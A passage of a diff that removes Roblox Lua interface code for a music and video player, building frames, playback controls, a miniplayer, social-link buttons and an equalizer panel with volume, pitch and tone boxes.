-Tela3 = Instance.new("Frame")
-Tela3.Size = UDim2.new(0, 247, 0, 251)
-Tela3.Position = UDim2.new(0, 170, 0, 48)
-Tela3.BackgroundTransparency = 1
-Tela3.BorderSizePixel = 0
-Tela3.Visible = false
-Tela3.Parent = frame
-Tela4 = Instance.new("Frame")
-Tela4.Size = UDim2.new(0, 247, 0, 251)
-Tela4.Position = UDim2.new(0, 170, 0, 48)
-Tela4.BackgroundTransparency = 1
-Tela4.BorderSizePixel = 0
-Tela4.Visible = false
-Tela4.Parent = frame
-Tela5 = Instance.new("Frame")
-Tela5.Size = UDim2.new(0, 247, 0, 251)
-Tela5.Position = UDim2.new(0, 170, 0, 48)
-Tela5.BackgroundTransparency = 1
-Tela5.BorderSizePixel = 0
-Tela5.Visible = false
-Tela5.Parent = frame
-Tela6 = Instance.new("Frame")
-Tela6.Size = UDim2.new(0, 247, 0, 251)
-Tela6.Position = UDim2.new(0, 170, 0, 48)
-Tela6.BackgroundTransparency = 1
-Tela6.BorderSizePixel = 0
-Tela6.Visible = false
-Tela6.Parent = frame
-Welcome = Instance.new("Frame")
-Welcome.Size = UDim2.new(0, 235, 0, 43)
-Welcome.Position = UDim2.new(0, 6, 0, 6)
-Welcome.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Welcome.BorderSizePixel = 0
-Welcome.Parent = Tela1
-NomeWelcome = Instance.new("TextLabel")
-NomeWelcome.Size = UDim2.new(1, 0, 1, 0)
-NomeWelcome.Position = UDim2.new(0, 0, 0, 0)
-NomeWelcome.BackgroundTransparency = 1
-NomeWelcome.Text = Traducao.Welcome
-NomeWelcome.TextColor3 = Color3.fromRGB(255, 0, 0)
-NomeWelcome.Font = Enum.Font.SourceSansBold
-NomeWelcome.TextScaled = true
-NomeWelcome.Parent = Welcome
-Dev = Instance.new("Frame")
-Dev.Size = UDim2.new(0, 235, 0, 61)
-Dev.Position = UDim2.new(0, 6, 0, 58)
-Dev.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Dev.BorderSizePixel = 0
-Dev.Parent = Tela1
-FotoDev = Instance.new("ImageLabel")
-FotoDev.Size = UDim2.new(0, 47, 0, 46)
-FotoDev.Position = UDim2.new(0, 7, 0, 8)
-FotoDev.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-FotoDev.BackgroundTransparency = 0.5
-FotoDev.Image = "rbxassetid://86887253295141"
-FotoDev.Parent = Dev
-Linha = Instance.new("Frame")
-Linha.Size = UDim2.new(0, 2, 1, 0)
-Linha.Position = UDim2.new(0, 62, 0, 0)
-Linha.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha.BorderSizePixel = 0
-Linha.Parent = Dev
-TextoDev = Instance.new("TextLabel")
-TextoDev.Size = UDim2.new(1, -70, 1, 0)
-TextoDev.Position = UDim2.new(0, 66, 0, 0)
-TextoDev.BackgroundTransparency = 1
-TextoDev.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextoDev.Font = Enum.Font.SourceSansBold
-TextoDev.TextScaled = true
-TextoDev.RichText = true
-TextoDev.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.Dev .. "</font>\n<font color=\"rgb(178,34,34)\">Termux_404</font>"
-TextoDev.Parent = Dev
-Social = Instance.new("Frame")
-Social.Size = UDim2.new(0, 235, 0, 117)
-Social.Position = UDim2.new(0, 6, 0, 128)
-Social.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Social.BorderSizePixel = 0
-Social.Parent = Tela1
-SocialTitulo = Instance.new("Frame")
-SocialTitulo.Size = UDim2.new(1, 0, 0, 30)
-SocialTitulo.Position = UDim2.new(0, 0, 0, 0)
-SocialTitulo.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-SocialTitulo.BorderSizePixel = 0
-SocialTitulo.Parent = Social
-SocialTexto = Instance.new("TextLabel")
-SocialTexto.Size = UDim2.new(1, 0, 1, 0)
-SocialTexto.Position = UDim2.new(0, 0, 0, 0)
-SocialTexto.BackgroundTransparency = 1
-SocialTexto.Text = "Social"
-SocialTexto.TextColor3 = Color3.fromRGB(70, 130, 180)
-SocialTexto.Font = Enum.Font.SourceSansBold
-SocialTexto.TextScaled = true
-SocialTexto.Parent = SocialTitulo
-Discord = Instance.new("ImageButton")
-Discord.Size = UDim2.new(0, 223, 0, 32)
-Discord.Position = UDim2.new(0, 6, 0, 40)
-Discord.BackgroundColor3 = Color3.fromRGB(143, 42, 234)
-Discord.Parent = Social
-UIScaleDis = Instance.new("UIScale")
-UIScaleDis.Parent = Discord
-IconeDiscord = Instance.new("ImageLabel")
-IconeDiscord.Size = UDim2.new(0, 32, 0, 32)
-IconeDiscord.Position = UDim2.new(0, 0, 0, 0)
-IconeDiscord.BackgroundColor3 = Color3.fromRGB(40, 100, 240)
-IconeDiscord.Image = "rbxassetid://90602349315916"
-IconeDiscord.Parent = Discord
-TextoDiscord = Instance.new("TextLabel")
-TextoDiscord.Size = UDim2.new(1, -50, 1, 0)
-TextoDiscord.Position = UDim2.new(0, 39, 0, 0)
-TextoDiscord.BackgroundTransparency = 1
-TextoDiscord.Text = "Discord"
-TextoDiscord.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextoDiscord.Font = Enum.Font.Garamond
-TextoDiscord.TextScaled = true
-TextoDiscord.Parent = Discord
-You = Instance.new("ImageButton")
-You.Size = UDim2.new(0, 223, 0, 32)
-You.Position = UDim2.new(0, 6, 0, 79)
-You.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-You.Parent = Social
-UIScaleYou = Instance.new("UIScale")
-UIScaleYou.Parent = You
-IconeYou = Instance.new("ImageLabel")
-IconeYou.Size = UDim2.new(0, 32, 0, 32)
-IconeYou.Position = UDim2.new(0, 0, 0, 0)
-IconeYou.BackgroundColor3 = Color3.fromRGB(40, 100, 240)
-IconeYou.Image = "rbxassetid://111196037573101"
-IconeYou.Parent = You
-TextoYou = Instance.new("TextLabel")
-TextoYou.Size = UDim2.new(1, -50, 1, 0)
-TextoYou.Position = UDim2.new(0, 39, 0, 0)
-TextoYou.BackgroundTransparency = 1
-TextoYou.Text = "YouTube"
-TextoYou.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextoYou.Font = Enum.Font.Garamond
-TextoYou.TextScaled = true
-TextoYou.Parent = You
-Musica = Instance.new("ImageLabel")
-Musica.Size = UDim2.new(0, 235, 0, 120)
-Musica.Position = UDim2.new(0, 6, 0, 6)
-Musica.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Musica.BorderSizePixel = 0
-Musica.Visible = true
-Musica.ImageRectOffset = Vector2.new(0, 0)
-Musica.ImageRectSize = Vector2.new(0, 0)
-Musica.Image = "rbxassetid://120329190202259"
-Musica.Parent = Tela2
-Video = Instance.new("VideoFrame")
-Video.Size = UDim2.new(0, 235, 0, 120)
-Video.Position = UDim2.new(0, 6, 0, 6)
-Video.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Video.BorderSizePixel = 0
-Video.Visible = false
-Video.Video = ""
-Video.Volume = 1
-Video.Looped = false
-Video.Parent = nil
-BotaoTela = Instance.new("ImageButton")
-BotaoTela.Size = UDim2.new(0, 235, 0, 120)
-BotaoTela.Position = UDim2.new(0, 6, 0, 6)
-BotaoTela.BackgroundTransparency = 1
-BotaoTela.ClipsDescendants = true
-BotaoTela.Visible = true
-BotaoTela.ZIndex = 2
-BotaoTela.Parent = Tela2
-TempoAtual = Instance.new("Frame")
-TempoAtual.Size = UDim2.new(0, 55, 0, 20)
-TempoAtual.Position = UDim2.new(0, 6, 0, 6)
-TempoAtual.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TempoAtual.BackgroundTransparency = 0.5
-TempoAtual.ZIndex = 2
-TempoAtual.Parent = BotaoTela
-TempoTotal = Instance.new("Frame")
-TempoTotal.Size = UDim2.new(0, 55, 0, 20)
-TempoTotal.Position = UDim2.new(0, 174, 0, 6)
-TempoTotal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TempoTotal.BackgroundTransparency = 0.5
-TempoTotal.ZIndex = 2
-TempoTotal.Parent = BotaoTela
-TimerAtual = Instance.new("TextLabel")
-TimerAtual.Size = UDim2.new(1, 0, 1, 0)
-TimerAtual.Position = UDim2.new(0, 0, 0, 0)
-TimerAtual.BackgroundTransparency = 1
-TimerAtual.Text = "00:00"
-TimerAtual.TextColor3 = Color3.fromRGB(255, 255, 255)
-TimerAtual.TextScaled = true
-TimerAtual.Font = Enum.Font.SourceSansBold
-TimerAtual.ZIndex = 2
-TimerAtual.Parent = TempoAtual
-TimerTotal = Instance.new("TextLabel")
-TimerTotal.Size = UDim2.new(1, 0, 1, 0)
-TimerTotal.Position = UDim2.new(0, 0, 0, 0)
-TimerTotal.BackgroundTransparency = 1
-TimerTotal.Text = "00:00"
-TimerTotal.TextColor3 = Color3.fromRGB(255, 255, 255)
-TimerTotal.TextScaled = true
-TimerTotal.Font = Enum.Font.SourceSansBold
-TimerTotal.ZIndex = 2
-TimerTotal.Parent = TempoTotal
-Repetir = Instance.new("ImageButton")
-Repetir.Size = UDim2.new(0, 30, 0, 30)
-Repetir.Position = UDim2.new(0.5, -35, 0.5, -54)
-Repetir.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Repetir.BackgroundTransparency = 0.5
-Repetir.BorderSizePixel = 0
-Repetir.Image = "rbxassetid://72571947341676"
-Repetir.ZIndex = 2
-Repetir.Parent = BotaoTela
-Miniplayer = Instance.new("ImageButton")
-Miniplayer.Size = UDim2.new(0, 30, 0, 30)
-Miniplayer.Position = UDim2.new(0.5, 5, 0.5, -54)
-Miniplayer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Miniplayer.BackgroundTransparency = 0.5
-Miniplayer.BorderSizePixel = 0
-Miniplayer.Image = "rbxassetid://102723588572082"
-Miniplayer.ZIndex = 2
-Miniplayer.Parent = BotaoTela
-BarraProgresso = Instance.new("ImageButton")
-BarraProgresso.Size = UDim2.new(0, 223, 0, 10)
-BarraProgresso.Position = UDim2.new(0, 6, 0, 103)
-BarraProgresso.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-BarraProgresso.BorderSizePixel = 0
-BarraProgresso.AutoButtonColor = false
-BarraProgresso.ZIndex = 2
-BarraProgresso.Parent = BotaoTela
-Rastro = Instance.new("Frame")
-Rastro.Size = UDim2.new(0, 0, 1, 0)
-Rastro.Position = UDim2.new(0, 0, 0, 0)
-Rastro.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-Rastro.BorderSizePixel = 0
-Rastro.ZIndex = 2
-Rastro.Parent = BarraProgresso
-BolaProgresso = Instance.new("ImageButton")
-BolaProgresso.Size = UDim2.new(0, 16, 0, 16)
-BolaProgresso.Position = UDim2.new(0, 0, 0, -3)
-BolaProgresso.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-BolaProgresso.BorderSizePixel = 0
-BolaProgresso.AnchorPoint = Vector2.new(0, 0)
-BolaProgresso.ZIndex = 2
-BolaProgresso.Parent = BarraProgresso
-MicroBola = Instance.new("Frame")
-MicroBola.Size = UDim2.new(0, 6, 0, 6)
-MicroBola.Position = UDim2.new(0, 5, 0, 5)
-MicroBola.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-MicroBola.BorderSizePixel = 0
-MicroBola.ZIndex = 2
-MicroBola.Parent = BolaProgresso
-PlayerInfo = Instance.new("VideoFrame")
-PlayerInfo.Size = UDim2.new(0, 235, 0, 61)
-PlayerInfo.Position = UDim2.new(0, 6, 0, 135)
-PlayerInfo.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-PlayerInfo.BorderSizePixel = 0
-PlayerInfo.Parent = Tela2
-FotoAutor = Instance.new("ImageLabel")
-FotoAutor.Size = UDim2.new(0, 50, 0, 49)
-FotoAutor.Position = UDim2.new(0, 6, 0, 6)
-FotoAutor.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-FotoAutor.BorderSizePixel = 0
-FotoAutor.Visible = true
-FotoAutor.Image = "rbxassetid://130243480255582"
-FotoAutor.Parent = PlayerInfo
-Linha = Instance.new("Frame")
-Linha.Size = UDim2.new(0, 2, 1, 0)
-Linha.Position = UDim2.new(0, 63, 0, 0)
-Linha.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha.BorderSizePixel = 0
-Linha.Parent = PlayerInfo
-Linhah = Instance.new("Frame")
-Linhah.Size = UDim2.new(0, 2, 1, 0)
-Linhah.Position = UDim2.new(0, 170, 0, 0)
-Linhah.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linhah.BorderSizePixel = 0
-Linhah.Parent = PlayerInfo
-TituloMusica = Instance.new("TextLabel")
-TituloMusica.Size = UDim2.new(1, -140, 1, -8)
-TituloMusica.Position = UDim2.new(0, 70, 0, 4)
-TituloMusica.BackgroundTransparency = 1
-TituloMusica.TextColor3 = Color3.fromRGB(255, 255, 255)
-TituloMusica.Font = Enum.Font.SourceSansBold
-TituloMusica.TextScaled = true
-TituloMusica.RichText = true
-TituloMusica.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.Hey .. "</font>\n<font color=\"rgb(192,192,192)\">" .. Traducao.Play .. "</font>"
-TituloMusica.Parent = PlayerInfo
-Disco = Instance.new("ImageLabel")
-Disco.Size = UDim2.new(0, 50, 0, 49)
-Disco.Position = UDim2.new(0, 179, 0, 6)
-Disco.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Disco.BorderSizePixel = 0
-Disco.Visible = true
-Disco.Image = "rbxassetid://76801681748723"
-Disco.ClipsDescendants = true
-Disco.Parent = PlayerInfo
-Controles = Instance.new("Frame")
-Controles.Size = UDim2.new(0, 235, 0, 40)
-Controles.Position = UDim2.new(0, 6, 0, 205)
-Controles.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Controles.BorderSizePixel = 0
-Controles.Parent = Tela2
-Voltar = Instance.new("ImageButton")
-Voltar.Size = UDim2.new(0, 30, 0, 30)
-Voltar.Position = UDim2.new(0, 10, 0.5, -15)
-Voltar.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-Voltar.BorderSizePixel = 0
-Voltar.Image = "rbxassetid://88757150664292"
-Voltar.Parent = Controles
-Retroceder = Instance.new("ImageButton")
-Retroceder.Size = UDim2.new(0, 30, 0, 30)
-Retroceder.Position = UDim2.new(0, 55, 0.5, -15)
-Retroceder.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-Retroceder.BorderSizePixel = 0
-Retroceder.Image = "rbxassetid://122950454234379"
-Retroceder.Parent = Controles
-Play = Instance.new("ImageButton")
-Play.Size = UDim2.new(0, 30, 0, 30)
-Play.Position = UDim2.new(0.5, -15, 0.5, -15)
-Play.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-Play.BorderSizePixel = 0
-Play.Image = "rbxassetid://110560238983134"
-Play.Parent = Controles
-Adiantar = Instance.new("ImageButton")
-Adiantar.Size = UDim2.new(0, 30, 0, 30)
-Adiantar.Position = UDim2.new(1, -85, 0.5, -15)
-Adiantar.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-Adiantar.BorderSizePixel = 0
-Adiantar.Image = "rbxassetid://102857578902137"
-Adiantar.Parent = Controles
-Pular = Instance.new("ImageButton")
-Pular.Size = UDim2.new(0, 30, 0, 30)
-Pular.Position = UDim2.new(1, -40, 0.5, -15)
-Pular.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-Pular.BorderSizePixel = 0
-Pular.Image = "rbxassetid://82401540450034"
-Pular.Parent = Controles
-local imageButton2 = Instance.new("ImageButton")
-imageButton2.Size = UDim2.new(0.27, 0, 0.37, 0)
-imageButton2.AnchorPoint = Vector2.new(1, 1)
-imageButton2.Position = UDim2.new(1, -20, 1, -20)
-imageButton2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-imageButton2.BorderSizePixel = 0
-imageButton2.BackgroundTransparency = 1
-imageButton2.AutoButtonColor = false
-imageButton2.Active = true
-imageButton2.Visible = false
-imageButton2.ZIndex = 3
-imageButton2.Parent = nil
-Draggable(imageButton2, true)
-MiniMusica = Instance.new("ImageLabel")
-MiniMusica.Size = UDim2.new(1, 0, 1, 0)
-MiniMusica.Position = UDim2.new(0, 0, 0, 0)
-MiniMusica.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-MiniMusica.BorderSizePixel = 0
-MiniMusica.Visible = true
-MiniMusica.ImageRectOffset = Vector2.new(0, 0)
-MiniMusica.ImageRectSize = Vector2.new(0, 0)
-MiniMusica.Image = "rbxassetid://120329190202259"
-MiniMusica.ZIndex = 3
-MiniMusica.Parent = imageButton2
-MiniVideo = Instance.new("VideoFrame")
-MiniVideo.Size = UDim2.new(1, 0, 1, 0)
-MiniVideo.Position = UDim2.new(0, 0, 0, 0)
-MiniVideo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-MiniVideo.BorderSizePixel = 0
-MiniVideo.Visible = false
-MiniVideo.Video = ""
-MiniVideo.Volume = 1
-MiniVideo.Looped = false
-MiniVideo.ZIndex = 3
-MiniVideo.Parent = imageButton2
-MiniBack = Instance.new("ImageButton")
-MiniBack.Size = UDim2.new(0.18, -8, 0.27, 0)
-MiniBack.AnchorPoint = Vector2.new(0.5, 1)
-MiniBack.Position = UDim2.new(0.105, 0, 0.94, 0)
-MiniBack.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-MiniBack.BackgroundTransparency = 0.5
-MiniBack.Image = "rbxassetid://122582556337724"
-MiniBack.Visible = false
-MiniBack.ZIndex = 3
-MiniBack.Parent = imageButton2
-MiniRetroceder = Instance.new("ImageButton")
-MiniRetroceder.Size = UDim2.new(0.18, -8, 0.27, 0)
-MiniRetroceder.AnchorPoint = Vector2.new(0.5, 1)
-MiniRetroceder.Position = UDim2.new(0.3025, 0, 0.94, 0)
-MiniRetroceder.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-MiniRetroceder.BackgroundTransparency = 0.5
-MiniRetroceder.Image = "rbxassetid://95993997488260"
-MiniRetroceder.Visible = false
-MiniRetroceder.ZIndex = 3
-MiniRetroceder.Parent = imageButton2
-MiniPlay = Instance.new("ImageButton")
-MiniPlay.Size = UDim2.new(0.18, -8, 0.27, 0)
-MiniPlay.AnchorPoint = Vector2.new(0.5, 1)
-MiniPlay.Position = UDim2.new(0.5, 0, 0.94, 0)
-MiniPlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-MiniPlay.BackgroundTransparency = 0.5
-MiniPlay.Image = "rbxassetid://119936293795425"
-MiniPlay.Visible = false
-MiniPlay.ZIndex = 3
-MiniPlay.Parent = imageButton2
-MiniAvancar = Instance.new("ImageButton")
-MiniAvancar.Size = UDim2.new(0.18, -8, 0.27, 0)
-MiniAvancar.AnchorPoint = Vector2.new(0.5, 1)
-MiniAvancar.Position = UDim2.new(0.6975, 0, 0.94, 0)
-MiniAvancar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-MiniAvancar.BackgroundTransparency = 0.5
-MiniAvancar.Image = "rbxassetid://95582496868769"
-MiniAvancar.Visible = false
-MiniAvancar.ZIndex = 3
-MiniAvancar.Parent = imageButton2
-MiniSkip = Instance.new("ImageButton")
-MiniSkip.Size = UDim2.new(0.18, -8, 0.27, 0)
-MiniSkip.AnchorPoint = Vector2.new(0.5, 1)
-MiniSkip.Position = UDim2.new(0.895, 0, 0.94, 0)
-MiniSkip.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-MiniSkip.BackgroundTransparency = 0.5
-MiniSkip.Image = "rbxassetid://101914600863480"
-MiniSkip.Visible = false
-MiniSkip.ZIndex = 3
-MiniSkip.Parent = imageButton2
-TelaCheia = Instance.new("ImageButton")
-TelaCheia.Size = UDim2.new(0.18, -8, 0.27, 0)
-TelaCheia.AnchorPoint = Vector2.new(0.5, 0)
-TelaCheia.Position = UDim2.new(0.105, 0, 0.03, 0)
-TelaCheia.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TelaCheia.BackgroundTransparency = 0.5
-TelaCheia.Image = "rbxassetid://73952228795506"
-TelaCheia.Visible = false
-TelaCheia.ZIndex = 3
-TelaCheia.Parent = imageButton2
-FecharMini = Instance.new("ImageButton")
-FecharMini.Size = UDim2.new(0.18, -8, 0.27, 0)
-FecharMini.AnchorPoint = Vector2.new(0.5, 0)
-FecharMini.Position = UDim2.new(0.895, 0, 0.03, 0)
-FecharMini.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-FecharMini.BackgroundTransparency = 0.5
-FecharMini.Image = "rbxassetid://71780293592221"
-FecharMini.Visible = false
-FecharMini.ZIndex = 3
-FecharMini.Parent = imageButton2
-TituloEqua = Instance.new("Frame")
-TituloEqua.Size = UDim2.new(0, 235, 0, 43)
-TituloEqua.Position = UDim2.new(0, 6, 0, 6)
-TituloEqua.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-TituloEqua.BorderSizePixel = 0
-TituloEqua.Parent = Tela3
-NomeEqua = Instance.new("TextLabel")
-NomeEqua.Size = UDim2.new(1, 0, 1, 0)
-NomeEqua.Position = UDim2.new(0, 0, 0, 0)
-NomeEqua.BackgroundTransparency = 1
-NomeEqua.Text = Traducao.Equalizador
-NomeEqua.TextColor3 = Color3.fromRGB(255, 0, 0)
-NomeEqua.Font = Enum.Font.SourceSansBold
-NomeEqua.TextScaled = true
-NomeEqua.Parent = TituloEqua
-EquaFrame = Instance.new("Frame")
-EquaFrame.Size = UDim2.new(0, 235, 0, 187)
-EquaFrame.Position = UDim2.new(0, 6, 0, 58)
-EquaFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-EquaFrame.BorderSizePixel = 0
-EquaFrame.Parent = Tela3
-NoEquaFrame = Instance.new("Frame")
-NoEquaFrame.Size = UDim2.new(0, 235, 0, 129)
-NoEquaFrame.Position = UDim2.new(0, 6, 0, 116)
-NoEquaFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-NoEquaFrame.BorderSizePixel = 0
-NoEquaFrame.Visible = false
-NoEquaFrame.Parent = Tela3
-Blockedicon = Instance.new("ImageLabel")
-Blockedicon.Size = UDim2.new(0, 60, 0, 60)
-Blockedicon.AnchorPoint = Vector2.new(0.5, 0.5)
-Blockedicon.Position = UDim2.new(0.5, 0, 0.5, -23)
-Blockedicon.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-Blockedicon.BackgroundTransparency = 1
-Blockedicon.Image = "rbxassetid://140149151607570"
-Blockedicon.Parent = NoEquaFrame
-ErroEqua = Instance.new("TextLabel")
-ErroEqua.Size = UDim2.new(0, 224, 0, 42)
-ErroEqua.Position = UDim2.new(0, 5, 0, 82)
-ErroEqua.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-ErroEqua.BackgroundTransparency = 0.5
-ErroEqua.RichText = true
-ErroEqua.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.RecursoTi .. "</font>\n<font color=\"rgb(192,192,192)\">" .. Traducao.RecursoTe .. "</font>"
-ErroEqua.Font = Enum.Font.SourceSansBold
-ErroEqua.TextScaled = true
-ErroEqua.Parent = NoEquaFrame
-BaseSF = Instance.new("Frame")
-BaseSF.Size = UDim2.new(1, 0, 1, -4)
-BaseSF.Position = UDim2.new(0, 0, 0, 2)
-BaseSF.BackgroundTransparency = 1
-BaseSF.BorderSizePixel = 0
-BaseSF.ClipsDescendants = true
-BaseSF.Parent = EquaFrame
-ScrollEqua = Instance.new("ScrollingFrame")
-ScrollEqua.Size = UDim2.new(1, -1, 1, 0)
-ScrollEqua.Position = UDim2.new(0, 0, 0, 0)
-ScrollEqua.BackgroundTransparency = 1
-ScrollEqua.BorderSizePixel = 0
-ScrollEqua.ScrollBarThickness = 1
-ScrollEqua.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollEqua.ScrollBarImageTransparency = 0.5
-ScrollEqua.CanvasSize = UDim2.new(0, 0, 0, 1015)
-ScrollEqua.CanvasPosition = Vector2.new(0, 0)
-ScrollEqua.ScrollingDirection = Enum.ScrollingDirection.Y
-ScrollEqua.ScrollingEnabled = true
-ScrollEqua.ClipsDescendants = true
-ScrollEqua.Parent = BaseSF
-Volume = Instance.new("Frame")
-Volume.Size = UDim2.new(0, 219, 0, 35)
-Volume.Position = UDim2.new(0, 8, 0, 5)
-Volume.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Volume.Parent = ScrollEqua
-IconeVolume = Instance.new("ImageLabel")
-IconeVolume.Size = UDim2.new(0, 35, 0, 35)
-IconeVolume.Position = UDim2.new(0, 0, 0, 0)
-IconeVolume.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeVolume.BackgroundTransparency = 0
-IconeVolume.Image = "rbxassetid://89282663179812"
-IconeVolume.Parent = Volume
-VolumeBox = Instance.new("TextBox")
-VolumeBox.Size = UDim2.new(0, 182, 1, 0)
-VolumeBox.Position = UDim2.new(0, 39, 0, 0)
-VolumeBox.BackgroundTransparency = 1
-VolumeBox.Text = "1"
-VolumeBox.PlaceholderText = Traducao.Volume
-VolumeBox.TextWrapped = true
-VolumeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-VolumeBox.Font = Enum.Font.SourceSansBold
-VolumeBox.TextScaled = true
-VolumeBox.Parent = Volume
-Pitch = Instance.new("Frame")
-Pitch.Size = UDim2.new(0, 219, 0, 35)
-Pitch.Position = UDim2.new(0, 8, 0, 50)
-Pitch.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Pitch.Parent = ScrollEqua
-IconePitch = Instance.new("ImageLabel")
-IconePitch.Size = UDim2.new(0, 35, 0, 35)
-IconePitch.Position = UDim2.new(0, 0, 0, 0)
-IconePitch.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconePitch.BackgroundTransparency = 0
-IconePitch.Image = "rbxassetid://102339134358611"
-IconePitch.Parent = Pitch
-PitchBox = Instance.new("TextBox")
-PitchBox.Size = UDim2.new(0, 182, 1, 0)
-PitchBox.Position = UDim2.new(0, 39, 0, 0)
-PitchBox.BackgroundTransparency = 1
-PitchBox.Text = "1"
-PitchBox.PlaceholderText = "Pitch"
-PitchBox.TextWrapped = true
-PitchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-PitchBox.Font = Enum.Font.SourceSansBold
-PitchBox.TextScaled = true
-PitchBox.Parent = Pitch
-FrequenciaTitulo = Instance.new("Frame")
-FrequenciaTitulo.Size = UDim2.new(0, 219, 0, 25)
-FrequenciaTitulo.Position = UDim2.new(0, 8, 0, 105)
-FrequenciaTitulo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-FrequenciaTitulo.BackgroundTransparency = 0.6
-FrequenciaTitulo.BorderSizePixel = 1
-FrequenciaTitulo.Parent = ScrollEqua
-TextoFrenquencia = Instance.new("TextLabel")
-TextoFrenquencia.Size = UDim2.new(1, -70, 1, -4)
-TextoFrenquencia.Position = UDim2.new(0, 35, 0, 2)
-TextoFrenquencia.BackgroundTransparency = 1
-TextoFrenquencia.Text = Traducao.Freque
-TextoFrenquencia.Font = Enum.Font.Garamond
-TextoFrenquencia.TextColor3 = Color3.fromRGB(255, 0, 0)
-TextoFrenquencia.TextScaled = true
-TextoFrenquencia.Parent = FrequenciaTitulo
-Graves = Instance.new("Frame")
-Graves.Size = UDim2.new(0, 219, 0, 35)
-Graves.Position = UDim2.new(0, 8, 0, 150)
-Graves.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Graves.Parent = ScrollEqua
-IconeGraves = Instance.new("ImageLabel")
-IconeGraves.Size = UDim2.new(0, 35, 0, 35)
-IconeGraves.Position = UDim2.new(0, 0, 0, 0)
-IconeGraves.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeGraves.BackgroundTransparency = 0
-IconeGraves.Image = "rbxassetid://91932971942355"
-IconeGraves.Parent = Graves
-GravesBox = Instance.new("TextBox")
-GravesBox.Size = UDim2.new(0, 182, 1, 0)
-GravesBox.Position = UDim2.new(0, 39, 0, 0)
-GravesBox.BackgroundTransparency = 1
-GravesBox.Text = "1"
-GravesBox.PlaceholderText = Traducao.Graves
-GravesBox.TextWrapped = true
-GravesBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-GravesBox.Font = Enum.Font.SourceSansBold
-GravesBox.TextScaled = true
-GravesBox.Parent = Graves
-Medios = Instance.new("Frame")
-Medios.Size = UDim2.new(0, 219, 0, 35)
-Medios.Position = UDim2.new(0, 8, 0, 195)
-Medios.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Medios.Parent = ScrollEqua
-IconeMedios = Instance.new("ImageLabel")
-IconeMedios.Size = UDim2.new(0, 35, 0, 35)
-IconeMedios.Position = UDim2.new(0, 0, 0, 0)
-IconeMedios.BackgroundColor3 = Color3.fromRGB(37, 33, 32)
-IconeMedios.BackgroundTransparency = 0
-IconeMedios.Image = "rbxassetid://91932971942355"
-IconeMedios.Parent = Medios
-MediosBox = Instance.new("TextBox")
-MediosBox.Size = UDim2.new(0, 182, 1, 0)
-MediosBox.Position = UDim2.new(0, 39, 0, 0)
-MediosBox.BackgroundTransparency = 1
-MediosBox.Text = "1"
-MediosBox.PlaceholderText = Traducao.Medios
-MediosBox.TextWrapped = true
-MediosBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-MediosBox.Font = Enum.Font.SourceSansBold
-MediosBox.TextScaled = true
-MediosBox.Parent = Medios
-Agudos = Instance.new("Frame")
-Agudos.Size = UDim2.new(0, 219, 0, 35)
-Agudos.Position = UDim2.new(0, 8, 0, 240)
-Agudos.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Agudos.Parent = ScrollEqua
-IconeAgudos = Instance.new("ImageLabel")
-IconeAgudos.Size = UDim2.new(0, 35, 0, 35)
